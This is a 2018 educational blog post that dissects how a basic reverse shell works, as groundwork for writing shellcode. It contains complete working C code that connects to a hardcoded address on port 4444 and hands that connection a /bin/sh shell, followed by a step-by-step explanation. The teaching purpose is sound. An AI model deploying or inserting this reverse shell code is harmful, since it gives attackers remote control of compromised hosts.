---
layout: post
title: "Understanding Shellcode: The Reverse Shell"
category: Security
date: 2018-10-30
series: "Understanding Shellcode"
tags:
  - Shellcode
  - Security
---
A recent conversation with a coworker inspired me to start putting
together a series of blog posts to examine what it is that shellcode does.  In
the first installment, I'll dissect the basic reverse shell.

First, a couple of reminders: shellcode is the machine code that is injected
into the flow of a program as the result of an exploit.  It generally must be
position independent as you can't usually control where it will be loaded in
memory.  A reverse shell initiates a TCP connection from the compromised host
back to a host under the control of the attacker.  It then launches a shell with
which the attacker can interact.

<!--more-->

## Reverse Shell in C ##

Let's examine a basic reverse shell in C.  Error handling is elided, both for
the space in this post, and because most shellcode is not going to have error
handling.

```
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

void reverse_shell() {
  /* Allocate a socket for IPv4/TCP (1) */
  int sock = socket(AF_INET, SOCK_STREAM, 0);

  /* Setup the connection structure. (2) */
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(4444);

  /* Parse the IP address (3) */
  inet_pton(AF_INET, "192.168.22.33", &sin.sin_addr.s_addr);

  /* Connect to the remote host (4) */
  connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

  /* Duplicate the socket to STDIO (5) */
  dup2(sock, STDIN_FILENO);
  dup2(sock, STDOUT_FILENO);
  dup2(sock, STDERR_FILENO);

  /* Setup and execute a shell. (6) */
  char *argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);
}
```

## Reverse Shell Steps ##

As can be seen, there are approximately 6 steps in setting up a reverse shell.
Once they are understood, this can be converted to proper shellcode.

1. First we need to allocate a socket structure in the kernel with a call to
   `socket`.  This is a C library wrapper for a system call by the name
   `socketcall`.  (All socket system calls are done through this single system
   call.) It needs to know the address family (`AF_INET` for IPv4) and the
   socket type (`SOCK_STREAM` for TCP, it would be `SOCK_DGRAM` for UDP).  This
   returns an integer that is a file descriptor for the socket.
2. Next, we need to setup a `struct sockaddr_in`, which includes the family
   (`AF_INET` again), and the port number in network byte order (big-endian).
3. We also need to put the IP address into the structure.  `inet_pton` can parse
   a string form into the struct.  In a `struct sockaddr_in`, this is a 4 byte
   value, again in network byte order.
4. We now have the full structure setup, so we can initiate a connection to the
   remote host using the already-created socket.  This is done with a call to
   `connect`.  Like `socket`, this is a wrapper for the `socketcall` system
   call.
5. We want the shell to use our socket when it is handling standard input/output
   (`stdio`) functions.  To do this, we duplicate the file descriptor from the
   socket to each of `STDIN`, `STDOUT`, `STDERR`.  Like so many, `dup2()` is a
   thin wrapper around a system call.
6. Finally, we setup the arguments for our shell, and launch it with `execve`,
   yet another system call.  This one will replace the current binary image with
   the targeted binary (`/bin/sh`) and then execute it from the entry point.  It
   will execute with its standard input, output, and error connected to the
   network socket.
